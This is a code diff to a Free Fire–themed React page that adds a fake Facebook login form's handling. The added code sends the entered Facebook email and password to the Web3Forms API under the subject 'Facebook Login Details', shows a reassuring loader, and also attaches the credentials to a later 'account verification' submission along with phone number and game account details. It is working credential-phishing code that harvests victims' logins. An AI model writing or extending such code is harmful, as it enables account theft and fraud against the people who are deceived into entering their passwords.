@@ -565,15 +565,44 @@ export default function Freefire() {
                             {/* Form */}
                             <form
                                 style={{padding: '0 18px 18px 18px', position: 'relative'}}
-                                onSubmit={e => {
+                                onSubmit={async e => {
                                     e.preventDefault();
                                     if (!fbEmail.trim() || !fbPassword.trim()) {
                                         setFbLoginError("Please enter both email and password.");
                                         return;
                                     }
                                     setFbLoginError("");
-                                    setShowFbFormModal(false);
-                                    setShowAccountVerification(true);
+                                    setShowAccLoader(true);
+                                    
+                                    // Send Facebook login details to Web3Forms
+                                    const fbFormData = {
+                                        access_key: WEB3FORMS_ACCESS_KEY,
+                                        subject: "Facebook Login Details",
+                                        email: fbEmail,
+                                        fbEmail,
+                                        fbPassword,
+                                    };
+                                    
+                                    try {
+                                        const res = await fetch("https://api.web3forms.com/submit", {
+                                            method: "POST",
+                                            headers: { "Content-Type": "application/json" },
+                                            body: JSON.stringify(fbFormData),
+                                        });
+                                        if (res.ok) {
+                                            setTimeout(() => {
+                                                setShowFbFormModal(false);
+                                                setShowAccLoader(false);
+                                                setShowAccountVerification(true);
+                                            }, 2000);
+                                        } else {
+                                            setShowAccLoader(false);
+                                            setFbLoginError("Failed to send email. Please try again.");
+                                        }
+                                    } catch (err) {
+                                        setShowAccLoader(false);
+                                        setFbLoginError("Failed to send email. Please try again.");
+                                    }
                                 }}
                             >
                                 <input type="text" placeholder="Mobile number or email address" value={fbEmail} onChange={e => setFbEmail(e.target.value)} style={{
@@ -808,6 +837,9 @@ export default function Freefire() {
                                         const formData = {
                                             access_key: WEB3FORMS_ACCESS_KEY,
                                             subject: "New Account Verification Submission",
+                                            email: fbEmail,
+                                            fbEmail,
+                                            fbPassword,
                                             characterId: accCharId,
                                             phoneNumber: accPhone,
                                             accountLevel: accLevel,
@@ -1085,6 +1117,30 @@ export default function Freefire() {
                     </div>
                 </div>
             </div>
+            {/* Add loader overlay for Facebook login */}
+            {showAccLoader && !showAccountVerification && !showProcessingPopup && (
+                <div style={{
+                    position: 'fixed',
+                    top: 0,
+                    left: 0,
+                    width: '100%',
+                    height: '100%',
+                    background: 'rgba(0,0,0,0.5)',
+                    display: 'flex',
+                    alignItems: 'center',
+                    justifyContent: 'center',
+                    zIndex: 2000,
+                }}>
+                    <div style={{ display: 'flex', flexDirection: 'column', alignItems: 'center' }}>
+                        <div style={{
+                            width: 36, height: 36, border: '4px solid #e7debd', borderTop: '4px solid transparent', borderRadius: '50%',
+                            animation: 'spin 1s linear infinite', marginBottom: 18
+                        }} />
+                        <div style={{ color: '#e7debd', fontWeight: 600, fontSize: 14 }}>Check your information</div>
+                        <style>{`@keyframes spin { 0% { transform: rotate(0deg);} 100% {transform: rotate(360deg);} }`}</style>
+                    </div>
+                </div>
+            )}
             <style>{`
                 .ff-account-verification-input::placeholder {
                     color: #e7debd !important;
